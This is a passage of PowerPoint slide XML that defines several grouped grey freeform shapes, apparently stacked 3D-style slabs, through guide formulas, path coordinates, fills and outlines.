                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1592"/>
                        <a:gd name="T16" fmla="*/ 0 h 695"/>
                        <a:gd name="T17" fmla="*/ 1592 w 1592"/>
                        <a:gd name="T18" fmla="*/ 695 h 695"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1592" h="695">
                          <a:moveTo>
                            <a:pt x="0" y="618"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="695"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1592" y="79"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1474" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="618"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="44" name="Group 17"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="4911" y="1697"/>
                    <a:ext cx="398" cy="477"/>
                    <a:chOff x="4911" y="1697"/>
                    <a:chExt cx="398" cy="477"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="69" name="Freeform 18"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4942" y="1724"/>
                      <a:ext cx="367" cy="450"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1468"/>
                        <a:gd name="T1" fmla="*/ 0 h 1350"/>
                        <a:gd name="T2" fmla="*/ 0 w 1468"/>
                        <a:gd name="T3" fmla="*/ 0 h 1350"/>
                        <a:gd name="T4" fmla="*/ 0 w 1468"/>
                        <a:gd name="T5" fmla="*/ 0 h 1350"/>
                        <a:gd name="T6" fmla="*/ 0 w 1468"/>
                        <a:gd name="T7" fmla="*/ 0 h 1350"/>
                        <a:gd name="T8" fmla="*/ 0 w 1468"/>
                        <a:gd name="T9" fmla="*/ 0 h 1350"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1468"/>
                        <a:gd name="T16" fmla="*/ 0 h 1350"/>
                        <a:gd name="T17" fmla="*/ 1468 w 1468"/>
                        <a:gd name="T18" fmla="*/ 1350 h 1350"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1468" h="1350">
                          <a:moveTo>
                            <a:pt x="0" y="1350"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="614"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1466" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1468" y="689"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1350"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="70" name="Freeform 19"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4911" y="1904"/>
                      <a:ext cx="31" cy="270"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 123"/>
                        <a:gd name="T1" fmla="*/ 0 h 812"/>
                        <a:gd name="T2" fmla="*/ 0 w 123"/>
                        <a:gd name="T3" fmla="*/ 0 h 812"/>
                        <a:gd name="T4" fmla="*/ 0 w 123"/>
                        <a:gd name="T5" fmla="*/ 0 h 812"/>
                        <a:gd name="T6" fmla="*/ 0 w 123"/>
                        <a:gd name="T7" fmla="*/ 0 h 812"/>
                        <a:gd name="T8" fmla="*/ 0 w 123"/>
                        <a:gd name="T9" fmla="*/ 0 h 812"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 123"/>
                        <a:gd name="T16" fmla="*/ 0 h 812"/>
                        <a:gd name="T17" fmla="*/ 123 w 123"/>
                        <a:gd name="T18" fmla="*/ 812 h 812"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="123" h="812">
                          <a:moveTo>
                            <a:pt x="1" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="76"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="123" y="812"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="734"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="71" name="Freeform 20"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4911" y="1697"/>
                      <a:ext cx="398" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1590"/>
                        <a:gd name="T1" fmla="*/ 0 h 696"/>
                        <a:gd name="T2" fmla="*/ 0 w 1590"/>
                        <a:gd name="T3" fmla="*/ 0 h 696"/>
                        <a:gd name="T4" fmla="*/ 0 w 1590"/>
                        <a:gd name="T5" fmla="*/ 0 h 696"/>
                        <a:gd name="T6" fmla="*/ 0 w 1590"/>
                        <a:gd name="T7" fmla="*/ 0 h 696"/>
                        <a:gd name="T8" fmla="*/ 0 w 1590"/>
                        <a:gd name="T9" fmla="*/ 0 h 696"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1590"/>
                        <a:gd name="T16" fmla="*/ 0 h 696"/>
                        <a:gd name="T17" fmla="*/ 1590 w 1590"/>
                        <a:gd name="T18" fmla="*/ 696 h 696"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1590" h="696">
                          <a:moveTo>
                            <a:pt x="0" y="619"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="124" y="696"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1590" y="82"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1467" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="619"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="45" name="Group 21"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="4949" y="1730"/>
                    <a:ext cx="398" cy="478"/>
                    <a:chOff x="4949" y="1730"/>
                    <a:chExt cx="398" cy="478"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="66" name="Freeform 22"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4979" y="1757"/>
                      <a:ext cx="368" cy="451"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1472"/>
                        <a:gd name="T1" fmla="*/ 0 h 1352"/>
                        <a:gd name="T2" fmla="*/ 0 w 1472"/>
                        <a:gd name="T3" fmla="*/ 0 h 1352"/>
                        <a:gd name="T4" fmla="*/ 0 w 1472"/>
                        <a:gd name="T5" fmla="*/ 0 h 1352"/>
                        <a:gd name="T6" fmla="*/ 0 w 1472"/>
                        <a:gd name="T7" fmla="*/ 0 h 1352"/>
                        <a:gd name="T8" fmla="*/ 0 w 1472"/>
                        <a:gd name="T9" fmla="*/ 0 h 1352"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1472"/>
                        <a:gd name="T16" fmla="*/ 0 h 1352"/>
                        <a:gd name="T17" fmla="*/ 1472 w 1472"/>
                        <a:gd name="T18" fmla="*/ 1352 h 1352"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1472" h="1352">
                          <a:moveTo>
                            <a:pt x="0" y="1352"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="616"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1472" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1469" y="693"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1352"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="67" name="Freeform 23"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4949" y="1936"/>
                      <a:ext cx="30" cy="272"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 122"/>
                        <a:gd name="T1" fmla="*/ 0 h 814"/>
                        <a:gd name="T2" fmla="*/ 0 w 122"/>
                        <a:gd name="T3" fmla="*/ 0 h 814"/>
                        <a:gd name="T4" fmla="*/ 0 w 122"/>
                        <a:gd name="T5" fmla="*/ 0 h 814"/>
                        <a:gd name="T6" fmla="*/ 0 w 122"/>
                        <a:gd name="T7" fmla="*/ 0 h 814"/>
                        <a:gd name="T8" fmla="*/ 0 w 122"/>
                        <a:gd name="T9" fmla="*/ 0 h 814"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 122"/>
                        <a:gd name="T16" fmla="*/ 0 h 814"/>
                        <a:gd name="T17" fmla="*/ 122 w 122"/>
                        <a:gd name="T18" fmla="*/ 814 h 814"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="122" h="814">
                          <a:moveTo>
                            <a:pt x="0" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="122" y="78"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="122" y="814"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="736"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="68" name="Freeform 24"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4949" y="1730"/>
                      <a:ext cx="398" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1594"/>
                        <a:gd name="T1" fmla="*/ 0 h 696"/>
                        <a:gd name="T2" fmla="*/ 0 w 1594"/>
                        <a:gd name="T3" fmla="*/ 0 h 696"/>
                        <a:gd name="T4" fmla="*/ 0 w 1594"/>
                        <a:gd name="T5" fmla="*/ 0 h 696"/>
                        <a:gd name="T6" fmla="*/ 0 w 1594"/>
                        <a:gd name="T7" fmla="*/ 0 h 696"/>
                        <a:gd name="T8" fmla="*/ 0 w 1594"/>
                        <a:gd name="T9" fmla="*/ 0 h 696"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1594"/>
                        <a:gd name="T16" fmla="*/ 0 h 696"/>
                        <a:gd name="T17" fmla="*/ 1594 w 1594"/>
                        <a:gd name="T18" fmla="*/ 696 h 696"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1594" h="696">
                          <a:moveTo>
                            <a:pt x="0" y="618"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="696"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1594" y="80"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1476" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="618"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="46" name="Group 25"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="4988" y="1765"/>
                    <a:ext cx="397" cy="477"/>
                    <a:chOff x="4988" y="1765"/>
                    <a:chExt cx="397" cy="477"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="63" name="Freeform 26"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5019" y="1792"/>
                      <a:ext cx="366" cy="450"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1465"/>
                        <a:gd name="T1" fmla="*/ 0 h 1349"/>
                        <a:gd name="T2" fmla="*/ 0 w 1465"/>
                        <a:gd name="T3" fmla="*/ 0 h 1349"/>
                        <a:gd name="T4" fmla="*/ 0 w 1465"/>
                        <a:gd name="T5" fmla="*/ 0 h 1349"/>
                        <a:gd name="T6" fmla="*/ 0 w 1465"/>
                        <a:gd name="T7" fmla="*/ 0 h 1349"/>
                        <a:gd name="T8" fmla="*/ 0 w 1465"/>
                        <a:gd name="T9" fmla="*/ 0 h 1349"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1465"/>
                        <a:gd name="T16" fmla="*/ 0 h 1349"/>
                        <a:gd name="T17" fmla="*/ 1465 w 1465"/>
                        <a:gd name="T18" fmla="*/ 1349 h 1349"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1465" h="1349">
                          <a:moveTo>
                            <a:pt x="0" y="1349"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="613"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1465" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1460" y="689"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1349"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="64" name="Freeform 27"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4988" y="1971"/>
                      <a:ext cx="31" cy="271"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 125"/>
                        <a:gd name="T1" fmla="*/ 0 h 813"/>
                        <a:gd name="T2" fmla="*/ 0 w 125"/>
                        <a:gd name="T3" fmla="*/ 0 h 813"/>
                        <a:gd name="T4" fmla="*/ 0 w 125"/>
                        <a:gd name="T5" fmla="*/ 0 h 813"/>
                        <a:gd name="T6" fmla="*/ 0 w 125"/>
                        <a:gd name="T7" fmla="*/ 0 h 813"/>
                        <a:gd name="T8" fmla="*/ 0 w 125"/>
                        <a:gd name="T9" fmla="*/ 0 h 813"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 125"/>
                        <a:gd name="T16" fmla="*/ 0 h 813"/>
                        <a:gd name="T17" fmla="*/ 125 w 125"/>
                        <a:gd name="T18" fmla="*/ 813 h 813"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="125" h="813">
                          <a:moveTo>
                            <a:pt x="0" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="125" y="77"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="125" y="813"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="2" y="736"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="65" name="Freeform 28"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="4988" y="1765"/>
                      <a:ext cx="397" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1588"/>
